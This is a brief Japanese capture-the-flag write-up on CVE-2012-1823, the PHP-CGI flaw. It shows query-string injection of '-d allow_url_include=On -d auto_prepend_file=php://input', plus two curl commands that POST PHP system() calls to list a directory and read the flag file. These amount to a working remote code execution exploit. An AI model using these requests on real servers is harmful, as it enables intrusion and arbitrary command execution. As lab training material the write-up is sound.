12_Hypertext Preprocessor
=========================

Overview

## Description

CVE-2012-1823に関する問題。
PHPのオプションを組み合わせることにより、外部からのスクリプト実行が可能になってしまう。

以下の2つのphp.iniディレクティブを指定する。

```
allow_url_include=On
auto_prepend_file=php://input
```

###ディレクトリ内のファイル一覧を表示する
```
curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('ls -al'); ?>"
```
###flagを表示する
```
curl "http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input" -X POST -d "<?php system('cat flag_flag_flag.txt'); ?>"
```